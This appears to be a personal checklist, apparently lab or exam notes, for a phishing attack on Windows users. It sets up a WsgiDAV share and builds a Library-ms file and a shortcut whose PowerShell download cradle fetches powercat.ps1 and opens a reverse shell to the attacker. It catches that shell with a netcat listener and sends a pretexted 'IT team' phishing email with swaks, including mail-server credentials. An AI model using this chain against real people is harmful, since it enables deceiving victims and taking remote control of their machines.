
- [ ] Install WsgiDAV on your Kali Machine
```
pip3 install wsgidav
```

- [ ] Create a folder to serve files on WsgiDAV on your Kali Machine
```
mkdir /home/kali/Desktop/webdav
```

- [ ] Start WsgiDAV on port 80 on your Kali Machine
```
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/Desktop/webdav
```

- [ ] Create "`config.Library-ms`" Windows Library file for connecting to our WsgiDAV on your Windows Preparation machine and transfer to your Kali machine
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.xxx.xxx</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

- [ ] Start Python web server to serve `config.Library-ms` and `PowerCat.ps1` on your Kali machine
```
python3 -m http.server 80
```

- [ ] Copy `PowerCat.ps1` to the python web server directory folder on your Kali Machine
```
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```

- [ ] Transfer `config.Library-ms` to the python web server directory folder on your Kali Machine

- [ ] Create a shortcut "`automatic_configuration.lnk`" with a PowerShell Download Cradle and PowerCat Reverse Shell Execution downloaded from python web server on your Windows Preparation machine and transfer to your Kali Machine
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.xxx.xxx:8000/powercat.ps1');powercat -c 192.168.xxx.xxx -p 4444 -e powershell"
```

- [ ] Transfer Windows Shortcut to WsgiDAV folder on your Kali Machine

- [ ] Set up netcat reverse shell listener on your Kali Machine
```
nc -nlvp 4444
```

- [ ] Create a new file "`body.txt`" for phishing email on your Kali Machine
```
Hi all,

I'm a new member of the IT Team. 

Attached is a file to automatically apply some configurations.

Please download the attachment and double-click "automatic_configuration"

Please let me know if you have any questions or concerns!

Regards,
Someuser
```

- [ ] Send email using swaks on your Kali Machine
```
sudo swaks -t victim@thedomain.com --from someuser@thedomain.com -ap --attach config.Library-ms --server 192.168.yyy.yyy --body body.txt --header "Subject: Problems" --suppress-data
```
- Requires credentials to login to mail server
```
mailserveruser
MA1lSeVerP@ssw0rd
```

- [ ] Catch reverse shell on your Kali Machine